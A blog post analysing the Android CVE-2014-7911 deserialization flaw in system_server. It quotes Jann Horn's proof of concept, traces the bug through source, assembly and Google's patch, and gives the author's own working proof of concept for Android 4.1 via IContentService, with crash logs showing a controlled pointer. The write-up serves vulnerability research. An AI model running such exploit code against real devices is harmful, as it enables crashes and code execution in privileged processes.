<!DOCTYPE html>
<!--[if lt IE 7]> <html class="no-js lt-ie9 lt-ie8 lt-ie7"> <![endif]-->
<!--[if IE 7]> <html class="no-js lt-ie9 lt-ie8"> <![endif]-->
<!--[if IE 8]> <html class="no-js lt-ie9"> <![endif]-->
<!--[if gt IE 8]><!--> <html class="no-js"> <!--<![endif]-->
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Analysis of cve-2014-7911  &middot; Zeqi&#39;s Blog</title>
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="HandheldFriendly" content="True">
<meta name="MobileOptimized" content="320">
<meta name="viewport" content="width=device-width, initial-scale=1">


<meta name="description" content="" />

<meta name="keywords" content="Vulnerability, Analysis, ">


<meta property="og:title" content="Analysis of cve-2014-7911  &middot; Zeqi&#39;s Blog ">
<meta property="og:site_name" content="Zeqi&#39;s Blog"/>
<meta property="og:url" content="https://zeqiii.github.io/2016/02/29/analysis-of-cve-2014-7911/" />
<meta property="og:locale" content="en-EN">


<meta property="og:type" content="article" />
<meta property="og:description" content=""/>
<meta property="og:article:published_time" content="2016-02-29T16:34:11&#43;08:00" />
<meta property="og:article:modified_time" content="2016-02-29T16:34:11&#43;08:00" />

  
    
<meta property="og:article:tag" content="Vulnerability">
    
<meta property="og:article:tag" content="Analysis">
    
  

  
<meta name="twitter:card" content="summary" />
<meta name="twitter:site" content="@" />
<meta name="twitter:creator" content="@" />
<meta name="twitter:title" content="Analysis of cve-2014-7911" />
<meta name="twitter:description" content="" />
<meta name="twitter:url" content="https://zeqiii.github.io/2016/02/29/analysis-of-cve-2014-7911/" />
<meta name="twitter:domain" content="https://zeqiii.github.io/">
  

<script type="application/ld+json">
  {
    "@context": "http://schema.org",
    "@type": "Article",
    "headline": "Analysis of cve-2014-7911",
    "author": {
      "@type": "Person",
      "name": "http://profiles.google.com/+?rel=author"
    },
    "datePublished": "2016-02-29",
    "description": "",
    "wordCount":  4174 
  }
</script>



<link rel="canonical" href="https://zeqiii.github.io/2016/02/29/analysis-of-cve-2014-7911/" />

<link rel="apple-touch-icon-precomposed" sizes="144x144" href="https://zeqiii.github.io/touch-icon-144-precomposed.png">
<link href="https://zeqiii.github.io/favicon.png" rel="icon">

<meta name="generator" content="Hugo 0.15" />

  <!--[if lt IE 9]>
<script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
<script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
<![endif]-->

<link href='https://fonts.googleapis.com/css?family=Merriweather:300%7CRaleway%7COpen+Sans' rel='stylesheet' type='text/css'>
<link rel="stylesheet" href="https://zeqiii.github.io/css/font-awesome.min.css">
<link rel="stylesheet" href="https://zeqiii.github.io/css/style.css">
<link rel="stylesheet" href="https://zeqiii.github.io/css/highlight/default.css">

  
</head>
<body>
  <main id="main-wrapper" class="container main_wrapper has-sidebar">
    <header id="main-header" class="container main_header">
  <div class="container brand">
  <div class="container title h1-like">
  <a class="baselink" href="https://zeqiii.github.io/">
  Zeqi&#39;s Blog

</a>

</div>

  
<div class="container topline">
  

</div>


</div>

  <nav class="container nav primary no-print">
  

<a class="homelink" href="https://zeqiii.github.io/">Home</a>


  
<a href="https://zeqiii.github.io/post" title="Show list of posts">Posts</a>

<a href="https://zeqiii.github.io/tags" title="Show list of tags">Tags</a>

<a href="https://zeqiii.github.io/topics" title="Show list of topics">Topics</a>


</nav>

<div class="container nav secondary no-print">
  
<a id="contact-link-email" class="contact_link" href="mailto:zeqiii@163.com">
  <span class="fa fa-envelope-square"></span><span>email</span></a>



<a id="contact-link-github" class="contact_link" href="https://github.com/zeqiii">
  <span class="fa fa-github-square"></span><span>github</span></a>

















</div>


  

</header>


<article id="main-content" class="container main_content single">
  <header class="container hat">
  <h1>Analysis of cve-2014-7911
</h1>

  <div class="metas">
<time datetime="2016-02-29">29 Feb, 2016</time>


  
  &middot; Read in about 20 min
  &middot; (4174 Words)
  <br>
  
<a class="label" href="https://zeqiii.github.io/tags/vulnerability">Vulnerability</a>

<a class="label" href="https://zeqiii.github.io/tags/analysis">Analysis</a>



</div>

</header>

  <div class="container content">
  

<h2 id="a-brief-look">A brief look</h2>

<p>System_server is a process has <strong>system</strong> permission, to which one can send any serializable data. Although system_server won&rsquo;t invoke any functions of the received objected, but <code>finalize</code> will be called when <strong>GC</strong>.</p>

<p>Function <code>finalize</code> in <code>android.os.BinderProxy</code> calls a native function which has pointers, the pointers may be controlled by attackers. So <strong>GC</strong> may result in arbitrary code execution. <code>android.os.BinderProxy</code> isn&rsquo;t serializable, however, java.io.ObjectInputStream doesn&rsquo;t check whether an object really is serializable, attackers can craft a fake BinderProxy to acheive the goals.
As other one&rsquo;s blog says:</p>

<blockquote>
<p>ObjectInputStream doesn&rsquo;t validate that the serialized object&rsquo;s class type, as described in the serialized object, is actually serializable. It creates an instance of the wanted class anyway with the deserialized values of the object. Therefore, one can create object of any class, and control its private variables, by serializing objects from another class, that would be deserialized as data members of the wanted class.</p>
</blockquote>

<h2 id="poc">POC</h2>

<p>Let&rsquo;s just see the POC written by <strong>Jann Horn</strong></p>

<ul>
<li>AAdroid.os.BinderProxy.java</li>
</ul>

<pre><code class="language-java">public class BinderProxy implements Serializable {
   private static final long serialVersionUID = 0;
   //public long mObject = 0x1337beef;
   //public long mOrgue = 0x1337beef;
   private int mObject = 0x1337beef;
   private int mOrgue = 0x1337beef;
}
</code></pre>

<ul>
<li>Partial code of MainActivity.java</li>
</ul>

<pre><code class="language-java">// Put the fake BinderProxy object into a Bundle
Bundle b = new Bundle();
AAdroid.os.BinderProxy evilProxy = new AAdroid.os.BinderProxy();
b.putSerializable(&quot;eatthis&quot;, evilProxy);

// Get IUserManager using reflection
Class clIUserManager = Class.forName(&quot;android.os.IUserManager&quot;);
// Get inner class Stub from IUserManager
Class[] umSubclasses = clIUserManager.getDeclaredClasses();
Class clStub = null;
for (Class c: umSubclasses) {
    if (c.getCanonicalName().equals(&quot;android.os.IUserManager.Stub&quot;)) {
        clStub = c;
    }
}
// Get the field &quot;TRANSACTION_setApplicationRestrictions&quot;
Field fTRANSACTION_setApplicationRestrictions = clStub.getDeclaredField(&quot;TRANSACTION_setApplicationRestrictions&quot;);
fTRANSACTION_setApplicationRestrictions.setAccessible(true);
TRANSACTION_setApplicationRestrictions = fTRANSACTION_setApplicationRestrictions.getInt(null);

// Get UserManager
UserManager um = (UserManager) ctx.getSystemService(Context.USER_SERVICE);
// mService is a field of UserManager, its type is IUserManager
Field fService = UserManager.class.getDeclaredField(&quot;mService&quot;);
fService.setAccessible(true);
// Get mService from UserManager
Object proxy = fService.get(um);

// Get Stub.Proxy from clStub
Class[] stSubclasses = clStub.getDeclaredClasses();
clProxy = null;
for (Class c: stSubclasses) {
    if (c.getCanonicalName().equals(&quot;android.os.IUserManager.Stub.Proxy&quot;)) {
        clProxy = c;
    }
}
// Get field mRemote from Proxy
Field fRemote = clProxy.getDeclaredField(&quot;mRemote&quot;);
fRemote.setAccessible(true);
mRemote = (IBinder) fRemote.get(proxy);
UserHandle me = android.os.Process.myUserHandle();

// Triggr it!
setApplicationRestrictions(ctx.getPackageName(), b, me.hashCode());
</code></pre>

<ul>
<li>Implementation of setApplicationRestrictions</li>
</ul>

<pre><code class="language-java">// This function modifies the Bundle, marshalling it, find &quot;AAdr&quot; and changing it to &quot;andr&quot;, so the class description becomes &quot;android.os.BinderProxy&quot;
public void setApplicationRestrictions(java.lang.String packageName, android.os.Bundle restrictions, int userHandle) throws android.os.RemoteException 
{ 
    android.os.Parcel _data = android.os.Parcel.obtain(); 
    android.os.Parcel _reply = android.os.Parcel.obtain(); 
    try { 
        _data.writeInterfaceToken(DESCRIPTOR); 
        _data.writeString(packageName); 
        _data.writeInt(1); 
        restrictions.writeToParcel(_data, 0); 
        _data.writeInt(userHandle); 
        byte[] data = _data.marshall(); 
        for (int i=0; true; i++) { 
            if (data[i] == 'A' &amp;&amp; data[i+1] == 'A' &amp;&amp; data[i+2] == 'd' &amp;&amp; data[i+3] == 'r') { 
                data[i] = 'a'; 
                data[i+1] = 'n'; 
                break; 
            } 
        } 
        _data.recycle(); 
        _data = Parcel.obtain(); 
        _data.unmarshall(data, 0, data.length); 
        mRemote.transact(TRANSACTION_setApplicationRestrictions, _data, _reply, 0); 
        _reply.readException(); 
    } 
    finally { 
        _reply.recycle(); 
        _data.recycle(); 
    }
}
</code></pre>

<p>From the POC we know that a fake object is created and put into a bundle. It&rsquo;s <code>mObject</code> and <code>mOrgue</code> is under attacker&rsquo;s controll and can be set to any values. In function <code>setApplicationRestrictions()</code>, the bundle object is written to a parcel using <code>restrictions.writeToParcel()</code>. After the parcel marshalled to a byte array, a loop appears to find string <code>AAdr</code>, and change <code>AA</code> to <code>an</code>. Thus, <code>AAdroid.os.BinderProxy</code> finally becomes <code>android.os.BinderProxy</code>. When <code>java.io.ObjectInputStream</code> deserializes this object, a <code>android.os.BinderProxy</code> object will be created. In this way, attackers can create any object and set the field value as they want.</p>

<h2 id="why-binderproxy">Why BinderProxy?</h2>

<p>So why attackers choose <code>android.os.BinderProxy</code>? Here is the source code of it.</p>

<pre><code class="language-java">protected void finalize() throws Throwable {
	destroy();
	super.finalize();
	return;
	Exception exception;
	exception;
	super.finalize();
	throw exception;
}
</code></pre>

<p>The <code>finalize()</code> method will call a native method <code>distroy()</code>.</p>

<pre><code class="language-c++">static void android_os_BinderProxy_destroy(JNIEnv* env, jobject obj) {
    IBinder* b = (IBinder*)
            env-&gt;GetIntField(obj, gBinderProxyOffsets.mObject);
    DeathRecipientList* drl = (DeathRecipientList*)
            env-&gt;GetIntField(obj, gBinderProxyOffsets.mOrgue);
    LOGDEATH(&quot;Destroying BinderProxy %p: binder=%p drl=%p\n&quot;, obj, b, drl);
    env-&gt;SetIntField(obj, gBinderProxyOffsets.mObject, 0);
    env-&gt;SetIntField(obj, gBinderProxyOffsets.mOrgue, 0);
    drl-&gt;decStrong((void*)javaObjectForIBinder);
    b-&gt;decStrong((void*)javaObjectForIBinder);
    IPCThreadState::self()-&gt;flushCommands();
}
</code></pre>

<p>In the above method, <code>mOrgue</code> is regarded as a pointer of <code>DeathRecipientList</code>, assigned to <code>drl</code>. Then <code>drl-&gt;decStrong()</code> is invoked.</p>

<pre><code class="language-c++">void RefBase::decStrong(const void* id) const {
    weakref_impl* const refs = mRefs;
    refs-&gt;removeStrongRef(id);
    const int32_t c = android_atomic_dec(&amp;refs-&gt;mStrong);
#if PRINT_REFS
    ALOGD(&quot;decStrong of %p from %p: cnt=%d\n&quot;, this, id, c);
#endif
    ALOG_ASSERT(c &gt;= 1, &quot;decStrong() called on %p too many times&quot;, refs);
    if (c == 1) {
        refs-&gt;mBase-&gt;onLastStrongRef(id);
        if ((refs-&gt;mFlags&amp;OBJECT_LIFETIME_MASK) == OBJECT_LIFETIME_STRONG) {
            delete this;
        }
    }
    refs-&gt;decWeak(id);
}
</code></pre>

<p>According to other&rsquo;s blog, <code>refs-&gt;mBase-&gt;onLastStrongRef(id);</code> will eventually causes arbitrary code execution. Below is the assembly code sceenshot from <a href="http://wooyun.org/">wooyun.org</a>, attacker controlls r0 (<code>this</code> pointer).</p>

<p><img src="/img/cve-2014-7911/assembly.png" alt="Image of assembly" /></p>

<pre><code class="language-c++">weakref_impl* const refs = mRefs;
refs-&gt;removeStrongRef(id);
const int32_t c = android_atomic_dec(&amp;refs-&gt;mStrong);
</code></pre>

<p>Transferred to assembly is:</p>

<pre><code class="language-assembly">ldr     r4, [r0, #4]   ; attacker controls r0 also r4
mov     r6, r1
mov     r0, r4
blx     &lt;android_atomic_dec ()&gt;
</code></pre>

<p>Then</p>

<pre><code class="language-c++">if (c == 1) {
	refs-&gt;mBase-&gt;onLastStrongRef(id);
</code></pre>

<p>Transferred to assembly is:</p>

<pre><code class="language-assembly">cmp     r0, #1
bne.n   d1ea
ldr     r0, [r4, #8]  ; attacker controls r4 also r0
mov     r1, r6
ldr     r3, [r0, #0]  ; attacker controls r0 also r3
ldr     r2, [r3, #12] ; attacker controls r3 also r2
blx     r2            ; execute code pointed by r2
</code></pre>

<p>If everything goes smoothly, the code pointed by r2 will be executed.</p>

<h2 id="key-point-one-how-aadroid-os-binderproxy-becomes-android-os-binderproxy">Key Point One: How AAdroid.os.BinderProxy Becomes android.os.BinderProxy</h2>

<p>Firstly, a fake BinderProxy object is put into a Bundle. Look into android source code, we can find:</p>

<ul>
<li>Function <code>putSerializable()</code> puts the fake object into <code>Bundle.mMap</code>.</li>
</ul>

<p>Then the Bundle object is written to a parcel.</p>

<ul>
<li><code>writeToParcel()</code> calls <code>writeArrayMapInternal()</code>, write the data in <code>mMap</code> to parcel.</li>
<li><code>writeArrayMapInternal()</code> calls <code>writeValue(Object v)</code>, to write the value of <code>mMap</code> into parcel. If the value is an instance of <code>Serializable</code>, it calls <code>writeSerializable(Serializable serial)</code>.</li>
<li>In android 4.4.2, <code>writeSerializable()</code> is implemented as below. It uses <code>ObjectOutputStream</code>.</li>
</ul>

<pre><code class="language-java">public final void writeSerializable(Serializable s) {
    if (s == null) {
        writeString(null);
        return;
    }
    String name = s.getClass().getName();
    writeString(name);
    ByteArrayOutputStream baos = new ByteArrayOutputStream();
    try {
        // Output flat
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        oos.writeObject(s);
        oos.close();
        writeByteArray(baos.toByteArray());
    } catch (IOException ioe) {
        throw new RuntimeException(&quot;Parcelable encountered &quot; +
            &quot;IOException writing serializable object (name = &quot; + name +
            &quot;)&quot;, ioe);
    }
}
</code></pre>

<p>**Then the POC uses <code>Parcel.marshall()</code> to get a byte array and modify its content, changing <code>AA</code> to <code>an</code>. **</p>

<p>Then <code>unmarshall()</code> this array to get a new parcel object and send to system_server.</p>

<h2 id="key-point-two-how-it-is-triggered">Key Point Two: How it is triggered</h2>

<p>Once system_server receive a parcel object from <code>Stub</code>, function <code>onTransact()</code> takes the responsibility for reading data from parcel. The bundle will be restore by <code>Parcel.readBundle()</code>.</p>

<pre><code class="language-java">public final Bundle readBundle(ClassLoader loader) {
    int length = readInt();
    if (length &lt; 0) {
        ... /* omitted */
    }    
    final Bundle bundle = new Bundle(this, length);
    if (loader != null) {
        bundle.setClassLoader(loader);
    }
    return bundle;
}
</code></pre>

<p>Constructor <code>Bundle(Parcel, int)</code> init <code>Bundle.mParcelledData</code>, which can be parsed into <code>Bundle.mMap</code> by <code>unparcel()</code>.</p>

<p>Fake object is get out by fucntion <code>Bundle.getSerializable()</code></p>

<pre><code class="language-java">public Serializable getSerializable(String key) {
    unparcel();
    Object o = mMap.get(key);
    if (o == null) {
        return null;
    }
    try {
        return (Serializable) o;
    } catch (ClassCastException e) {
        typeWarning(key, o, &quot;Serializable&quot;, e);
        return null;
    }
}

synchronized void unparcel() {
        
    /* omitted */

    mParcelledData.readArrayMapInternal(mMap, N, mClassLoader);
    mParcelledData.recycle();
    mParcelledData = null;
}

// when readArrayMapInternal encounters a serializable type, it invokes readSerializable()
public final Serializable readSerializable() {
    String name = readString();
    if (name == null) {
        /* omitted */
    }

    byte[] serializedData = createByteArray();
    ByteArrayInputStream bais = new ByteArrayInputStream(serializedData);
    try {
        ObjectInputStream ois = new ObjectInputStream(bais);
        /* Problems exist here, an mal-formed BinderProxy obj will be created. */
        /* When GC, the vulnerability is triggered */
        return (Serializable) ois.readObject();
    } catch (IOException ioe) {
        /* omitted */
    }
}
</code></pre>

<h2 id="google-s-patch">Google&rsquo;s Patch</h2>

<pre><code class="language-java">+    public Class&lt;?&gt; checkAndGetTcObjectClass() throws InvalidClassException {
+        // We check some error possibilities that might cause problems later.
+        boolean wasSerializable = (flags &amp; ObjectStreamConstants.SC_SERIALIZABLE) != 0;
+        boolean wasExternalizable = (flags &amp; ObjectStreamConstants.SC_EXTERNALIZABLE) != 0;
+        if (wasSerializable == wasExternalizable) {
+            throw new InvalidClassException(
+                    getName() + &quot; stream data is corrupt: SC_SERIALIZABLE=&quot; + wasSerializable
+                            + &quot; SC_EXTERNALIZABLE=&quot; + wasExternalizable
+                            + &quot;, classDescFlags must have one or the other&quot;);
+        }
+
+        // TC_ENUM is handled elsewhere. See checkAndGetTcEnumClass().
+        if (isEnum()) {
+            throw new InvalidClassException(
+                    getName() + &quot; local class is incompatible: Local class is an enum, streamed&quot;
+                            + &quot; data is tagged with TC_OBJECT&quot;);
+        }
+
+        // isSerializable() is true if the local class implements Serializable. Externalizable
+        // classes are also Serializable via inheritance.
+        if (!isSerializable()) {
+            throw new InvalidClassException(getName() + &quot; local class is incompatible: Not&quot;
+                    + &quot; Serializable&quot;);
+        }
+
+        // The stream class was externalizable, but is only serializable locally.
+        if (wasExternalizable != isExternalizable()) {
+            throw new InvalidClassException(
+                    getName() + &quot; local class is incompatible: Local class is Serializable, stream&quot;
+                            + &quot; data requires Externalizable&quot;);
+        }
+
+        // The following are left unchecked and thus are treated leniently at this point.
+        // SC_BLOCK_DATA may be set iff SC_EXTERNALIZABLE is set AND version 2 of the protocol is in
+        // use.
+        // SC_ENUM should not be set.
+
+        return forClass();
+    }
</code></pre>

<p>More information in detail, see <a href="https://android.googlesource.com/platform/libcore/+/738c833d38d41f8f76eb7e77ab39add82b1ae1e2">android.googlesource.com</a></p>

<h2 id="my-experiment">My Experiment</h2>

<h3 id="one-demo-on-hongmi-android-4-2">One: Demo on HongMi (android 4.2)</h3>

<p>I write two apks, a client and a server.</p>

<p>Client represents the attacker, server represents a system_server. The things client does are the same as POC. Partial of the server&rsquo;s code is:</p>

<pre><code class="language-java">public class ServiceImpl extends MyService.Stub {
    @Override
    public void setApplicationRestrictions(String packageName, Bundle restrictions, int userHandler) throws RemoteException {
        Log.e(&quot;remote&quot;, packageName);
        Object obj = restrictions.get(&quot;eathis&quot;);
        Log.e(&quot;remote&quot;, obj.getClass().getName());
    }
}
</code></pre>

<p>Running client doesn&rsquo;t cause a crash of the phone, but the exceptions below:</p>

<pre><code>03-02 11:21:20.802 4855-4866/cn.ac.iie.cve20147911_server E/remote: test
03-02 11:21:20.815 4855-4866/cn.ac.iie.cve20147911_server E/JavaBinder: *** Uncaught remote exception!  (Exceptions are not yet supported across processes.)
    java.lang.RuntimeException: Parcelable encountered IOException reading a Serializable object (name = AAdroid.os.BinderProxy)
    at android.os.Parcel.readSerializable(Parcel.java:2144)
    at android.os.Parcel.readValue(Parcel.java:2016)
    at android.os.Parcel.readMapInternal(Parcel.java:2226)
    at android.os.Bundle.unparcel(Bundle.java:223)
    at android.os.Bundle.get(Bundle.java:282)
    at cn.ac.iie.cve20147911_server.ServiceImpl.setApplicationRestrictions(ServiceImpl.java:17)
    at cn.ac.iie.cve20147911_server.MyService$Stub.onTransact(MyService.java:61)
    at android.os.Binder.execTransact(Binder.java:351)
    at dalvik.system.NativeStart.run(Native Method)
    Caused by: java.io.InvalidClassException: android.os.BinderProxy local class is incompatible: Not Serializable
        at java.io.ObjectStreamClass.checkAndGetTcObjectClass(ObjectStreamClass.java:1330)
        at java.io.ObjectInputStream.readNewObject(ObjectInputStream.java:1818)
        at java.io.ObjectInputStream.readNonPrimitiveContent(ObjectInputStream.java:787)
        at java.io.ObjectInputStream.readObject(ObjectInputStream.java:2013)
        at java.io.ObjectInputStream.readObject(ObjectInputStream.java:1970)
        at android.os.Parcel.readSerializable(Parcel.java:2142)
        at android.os.Parcel.readValue(Parcel.java:2016) 
        at android.os.Parcel.readMapInternal(Parcel.java:2226) 
        at android.os.Bundle.unparcel(Bundle.java:223) 
        at android.os.Bundle.get(Bundle.java:282) 
        at cn.ac.iie.cve20147911_server.ServiceImpl.setApplicationRestrictions(ServiceImpl.java:17) 
        at cn.ac.iie.cve20147911_server.MyService$Stub.onTransact(MyService.java:61) 
        at android.os.Binder.execTransact(Binder.java:351) 
        at dalvik.system.NativeStart.run(Native Method) 
</code></pre>

<p>From the call stack, we conclude that the analysis we did before are right, and HongMi&rsquo;s system is patched because there is an exception raised from fucntion <code>ObjectStreamClass.checkAndGetTcObjectClass()</code> which is added in the patch. Notice that <code>android.os.BinderProxy</code> appears on the exception.</p>

<h3 id="demo-on-huawei-android-4-1">Demo on HuaWei (android 4.1)</h3>

<p>Do the same thing on an HuaWei phone, the second exception disappeared!</p>

<pre><code>03-02 14:37:00.357 31139-31154/cn.ac.iie.cve20147911_server E/remote: test
03-02 14:37:00.360 31139-31154/cn.ac.iie.cve20147911_server E/JavaBinder: *** Uncaught remote exception!  (Exceptions are not yet supported across processes.)
    java.lang.ClassCastException: android.os.BinderProxy cannot be cast to java.io.Serializable
    at android.os.Parcel.readSerializable(Parcel.java:2142)
    at android.os.Parcel.readValue(Parcel.java:2016)
    at android.os.Parcel.readMapInternal(Parcel.java:2226)
    at android.os.Bundle.unparcel(Bundle.java:223)
    at android.os.Bundle.get(Bundle.java:282)
    at cn.ac.iie.cve20147911_server.ServiceImpl.setApplicationRestrictions(ServiceImpl.java:17)
    at cn.ac.iie.cve20147911_server.MyService$Stub.onTransact(MyService.java:61)
    at android.os.Binder.execTransact(Binder.java:367)
    at dalvik.system.NativeStart.run(Native Method)
</code></pre>

<p>This exception is just a ClassCastException, which means android.os.BinderProxy has been created, it just can&rsquo;t be casted to java.io.Serializable.</p>

<h3 id="debugging">Debugging</h3>

<p>Set a breakpoint in our simulated system-server at this line:</p>

<p><img src="/img/cve-2014-7911/breakpoint.png" alt="breakpoint screenshot" /></p>

<p>Attach debugger to the process and follow the steps analyzed before, we can track the exucetion to <code>Parcel.readSerializable()</code></p>

<p><img src="/img/cve-2014-7911/readserializable.png" alt="breakpoint readSerializable()" /></p>

<p><code>ois.readObject()</code> suppose to create a android.os.BinderProxy object with its <code>mOrgue</code> and <code>mObject</code> set to <code>0x1337beef</code>, but because of the exception <code>ClassCastException</code>, tracking will break and debugger will stop there, so that we can&rsquo;t see the result. In order to track the result of <code>ois.readObject()</code>, I use Xposed to hook <code>Parcel.readSerializable()</code>.</p>

<pre><code class="language-java">public class HookParcel implements IXposedHookLoadPackage {
    @Override
    public void handleLoadPackage(XC_LoadPackage.LoadPackageParam loadPackageParam) throws Throwable {
        findAndHookMethod(
                &quot;android.os.Parcel&quot;,
                loadPackageParam.classLoader,
                &quot;readSerializable&quot;,
                new XC_MethodHook() {
                    protected void beforeHookedMethod(MethodHookParam param) throws Throwable {
                        Parcel parcel = (Parcel) param.thisObject;
                        String name = parcel.readString();
                        if (name == null) {
                            param.setResult(null);
                        } else {
                            byte[] serializedData = parcel.createByteArray();
                            ByteArrayInputStream bais = new ByteArrayInputStream(serializedData);
                            ObjectInputStream ois = new ObjectInputStream(bais);
                            Object obj = ois.readObject();
                            XposedBridge.log(name);
                            if (name.equals(&quot;AAdroid.os.BinderProxy&quot;)) {
                                XposedBridge.log(obj.getClass().getName());
                                if (obj.getClass().getName().equals(&quot;android.os.BinderProxy&quot;)) {
                                    Class clz = obj.getClass();
                                    Field mOrgue = clz.getDeclaredField(&quot;mOrgue&quot;);
                                    Field mObject = clz.getDeclaredField(&quot;mObject&quot;);
                                    mObject.setAccessible(true);
                                    mOrgue.setAccessible(true);
                                    int v_mObject = mObject.getInt(obj);
                                    int v_mOrgue = mOrgue.getInt(obj);
                                    XposedBridge.log(&quot;mObject:&quot; + v_mObject);
                                    XposedBridge.log(&quot;mOrgue:&quot; + v_mOrgue);
                                }
                            }
                            param.setResult((Serializable) obj);
                        }
                    }
                }

        );
    }
}
</code></pre>

<p>The hook does the same things as the original method, except printing some information we are interested in.</p>

<p><img src="/img/cve-2014-7911/xposedlog.png" alt="xposed log" /></p>

<h2 id="write-a-poc-for-android-4-1">Write A POC for Android 4.1</h2>

<p>It was until 4.2 that Android added UserManager. But all the phones I get with Android OS version 4.2 and above are patched. The only one that hasn&rsquo;t been patched, its OS version is 4.1, which dosen&rsquo;t have UserManagerService. So I have to find the other system-servers which are exploitable. Here are some properties that an exploitable system-server should have:</p>

<ul>
<li>It has functions receive Bundle type parameters.</li>
<li>The Bundle parameters must perform <code>Bundle.getXXX()</code> or <code>Bundle.get()</code> in order to trigger <code>Bundle.unparcel()</code>.</li>
</ul>

<p>Here I find manually find out the <code>android.content.IContentService</code> is what I want. It has a method named <code>requestSync()</code>, the definition in <code>IContentService.aidl</code> is:</p>

<pre><code class="language-java">void requestSync(in Account account, String authority, in Bundle extras);
</code></pre>

<p><code>com.android.server.content.ContentService</code> extends <code>IContentService.Stub</code> and implements its methods. <code>android.content.ContentResolver</code> can get a proxy of the server through a static method <code>ContentResolver.getContentService</code>. So the POC on Android 4.1 are like this.</p>

<pre><code class="language-java">protected void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    setContentView(R.layout.activity_main);

    Bundle bundle = new Bundle();
    bundle.putSerializable(&quot;eathis&quot;, new AAdroid.os.BinderProxy());
    bundle.putBoolean(ContentResolver.SYNC_EXTRAS_UPLOAD, false);

    try {
        Class clIContentService = Class.forName(&quot;android.content.IContentService&quot;);
        Class[] csSubClasses = clIContentService.getDeclaredClasses();
        for (Class c: csSubClasses) {
            if (c.getCanonicalName().equals(&quot;android.content.IContentService.Stub&quot;)) {
                clStub = c;
            }
        }
        Field fTRANSACTION_requestSync =
                clStub.getDeclaredField(&quot;TRANSACTION_requestSync&quot;);
        fTRANSACTION_requestSync.setAccessible(true);
        TRANSACTION_requestSync = fTRANSACTION_requestSync.getInt(null);

        ContentResolver resolver = getContentResolver();
        Method mGetContentService = ContentResolver.class.getDeclaredMethod(&quot;getContentService&quot;);
        objProxy = mGetContentService.invoke(resolver);

        Class[] stubSubClasses = clStub.getDeclaredClasses();
        for (Class c: stubSubClasses) {
            if (c.getCanonicalName().equals(&quot;android.content.IContentService.Stub.Proxy&quot;)) {
                clProxy = c;
            }
        }
        Field fRemote = clProxy.getDeclaredField(&quot;mRemote&quot;);
        fRemote.setAccessible(true);
        mRemote = (IBinder) fRemote.get(objProxy);

        AccountManager accountManager = (AccountManager) getSystemService(ACCOUNT_SERVICE);
        Account[] accounts = accountManager.getAccounts();
        requestSync(accounts[0], &quot;test&quot;, bundle);

    } catch (Exception e) {
            e.printStackTrace();
    }
}

public void requestSync(Account account, String authority, Bundle extras) throws  android.os.RemoteException {
    android.os.Parcel _data = android.os.Parcel.obtain();
    android.os.Parcel _reply = android.os.Parcel.obtain();
    try {
        _data.writeInterfaceToken(DESCRIPTOR);
        _data.writeInt(1);
        account.writeToParcel(_data, 0);
        _data.writeString(authority);
        _data.writeInt(1);
        extras.writeToParcel(_data, 0);

        byte[] data = _data.marshall();
        for (int i=0; true; i++) {
            if (data[i] == 'A' &amp;&amp; data[i+1] == 'A' &amp;&amp; data[i+2] == 'd' &amp;&amp; data[i+3] == 'r') {
                data[i] = 'a';
                data[i+1] = 'n';
                break;
            }
        }
        _data.recycle();
        _data = Parcel.obtain();
        _data.unmarshall(data, 0, data.length);
        mRemote.transact(TRANSACTION_requestSync, _data, _reply, 0);
        _reply.readException();
    } finally {
        _reply.recycle();
        _data.recycle();
    }
}
</code></pre>

<p>Run this application, then do some thing else to trigger GC, the phone is reboot! Logcat records this.</p>

<pre><code>D/dalvikvm(  366): WAIT_FOR_CONCURRENT_GC blocked 0ms
I/FramebufferNativeWindow(14753):
D/v_gralloc(14753): fb_post info:change to format argb8888
E/dalvikvm(  343): GC_CONCURRENT freed 1966K, 73% free 938K/3395K, paused 11ms+18ms, total 39ms
E/dalvikvm(  366): GC_EXPLICIT freed 5972K, 19% free 38023K/46535K, paused 3ms+13ms, total 110ms
F/libc    (  366): Fatal signal 11 (SIGSEGV) at 0x1337bef3 (code=1), thread 374 (FinalizerDaemon)
D/libEGL  ( 2684): loaded /system/lib/egl/libEGL_VIVANTE.so
D/libEGL  ( 2684): loaded /system/lib/egl/libGLESv1_CM_VIVANTE.so
D/libEGL  ( 2684): loaded /system/lib/egl/libGLESv2_VIVANTE.so
I/DEBUG   (  130): *** *** *** *** *** *** *** *** *** *** *** *** *** *** *** ***
I/DEBUG   (  130): Build fingerprint: 'Huawei/D2-0082/hwD2-0082:4.1.2/HuaweiD2-0082/C00B015:user/ota-rel-keys,release-keys'
I/DEBUG   (  130): pid: 366, tid: 374, name: FinalizerDaemon  &gt;&gt;&gt; system_server &lt;&lt;&lt;
I/DEBUG   (  130): signal 11 (SIGSEGV), code 1 (SEGV_MAPERR), fault addr 1337bef3
D/OpenGLRenderer( 2684): Enabling debug mode 0
E/dalvikvm(  636): GC_CONCURRENT freed 2539K, 20% free 19968K/24711K, paused 2ms+4ms, total 48ms
D/dalvikvm(  636): WAIT_FOR_CONCURRENT_GC blocked 41ms
I/DEBUG   (  130):     r0 1337beef  r1 401d60f9  r2 50e2a908  r3 5713afe4
I/DEBUG   (  130):     r4 402248ec  r5 1337beef  r6 f2100001  r7 407811a5
I/DEBUG   (  130):     r8 1337beef  r9 1337beef  sl 50e2a918  fp 5cf2ac94
I/DEBUG   (  130):     ip 40222d7c  sp 5cf2ac50  lr 401d5cf3  pc 400d8e44  cpsr 20000030
I/DEBUG   (  130):     d0  0000000100060101  d1  6d782e74012a5c44
I/DEBUG   (  130):     d2  617369646f6e5f61  d3  6f6c6f685f656c65
I/DEBUG   (  130):     d4  1f1f1f1f1f1f1f1f  d5  1f1f1f1f1f1f1f1f
I/DEBUG   (  130):     d6  014a0ff01f1f1f1f  d7  0000005a4ee91870
I/DEBUG   (  130):     d8  0000000000000000  d9  0000000000000000
I/DEBUG   (  130):     d10 0000000000000000  d11 0000000000000000
I/DEBUG   (  130):     d12 0000000000000000  d13 0000000000000000
I/DEBUG   (  130):     d14 0000000000000000  d15 0000000000000000
I/DEBUG   (  130):     d16 0000000300000002  d17 0000000000000000
I/DEBUG   (  130):     d18 0000000000000000  d19 0000000000000000
